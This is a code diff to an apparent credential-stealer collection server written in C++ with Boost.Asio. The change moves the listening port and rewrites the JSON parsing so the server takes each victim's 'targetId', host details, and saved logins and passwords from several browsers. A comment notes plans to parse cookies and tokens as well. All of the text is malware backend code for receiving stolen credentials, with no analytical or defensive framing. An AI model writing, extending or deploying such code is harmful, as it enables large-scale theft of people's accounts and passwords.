@@ -10,7 +10,7 @@ namespace ServerSide {
 
 	enum:uint16_t {
 		MAX_CONNECTIONS = 50,
-		PORT = 8080
+		PORT = 2323//8080
 	};
 
 	namespace ba = boost::asio;
@@ -42,8 +42,10 @@ namespace ServerSide {
 				std::unique_lock<std::mutex>rdLock(mt);
 				cv.wait(rdLock, [this] {return dataReady; });
 
-				parseMessage(requests.front()->reqData);
-				requests.pop();
+				if (requests.size()) {
+					parseMessage(requests.front()->reqData);
+					requests.pop();
+				}
 
 				if (dataReady = true) { //if processed in one thread set dataReady to false for prevention of other thread atempt to parsing this request again.
 					dataReady = false;
@@ -85,25 +87,36 @@ namespace ServerSide {
 
 			json::object jObj;
 			json::object targetInfo;
-			json::array loginData;
+			json::array browsers;
 			try {
 				jObj = boost::json::parse(msg).as_object();
-				targetInfo = jObj.at("targetInfo").as_object();
-				loginData = jObj.at("loginData").as_array();
 
 				data->_targetId = jObj.at("targetId").as_string();
+
+				targetInfo = jObj.at("targetInfo").as_object();
 
 				data->_targetInfo.os = targetInfo.at("os").as_string();
 				data->_targetInfo.hostName = targetInfo.at("hostname").as_string();
 				data->_targetInfo.resolution = targetInfo.at("resolution").as_string();
 
-				data->_browserData.browserName = jObj.at("Browser").as_string();
+				browsers = jObj.at("Browsers").as_array();
 
-				for (auto&elem : loginData) {
-					elem.as_object();
-					data->_browserData.resources.push_back(std::make_tuple(json::value_to<std::string>(elem.at("resource")),
-																		json::value_to<std::string>(elem.at("login")),
-																		json::value_to<std::string>(elem.at("password"))));
+				for (auto& name : browsers) { //iterations by browsers and their data's
+					std::unique_ptr<InterProcess::Data::BrowserData> bd
+						= std::make_unique<InterProcess::Data::BrowserData>();
+
+					bd->browserName = json::value_to<std::string>(name);
+
+					json::object browserData = jObj.at(json::value_to<std::string>(name)).as_object(); //pick all current browser data
+
+					json::array loginData = browserData.at("loginData").as_array();
+					for (auto& elem : loginData) {                                   //parse all login's data of current browser 
+						bd->resources.push_back(std::make_tuple(json::value_to<std::string>(elem.at("resource")),
+							json::value_to<std::string>(elem.at("login")),
+							json::value_to<std::string>(elem.at("password"))));
+					}
+					//parse cookies tokens and etc.
+					data->browsersData.push_back(std::move(bd)); //after all data's extract
 				}
 				ipc.newData(std::move(data));
 			}
@@ -156,7 +169,7 @@ namespace ServerSide {
 					if (bytesTransfered < 1024) { //when all the data arrived
 						request.shrink_to_fit(); //cut all trash bytes
 						_reqHandler(request);
-
+						
 						_buffer.fill(0);         //clear buffer
 						totalBytesTransfered = 0; //set income bytes counter to deffault 
 					}
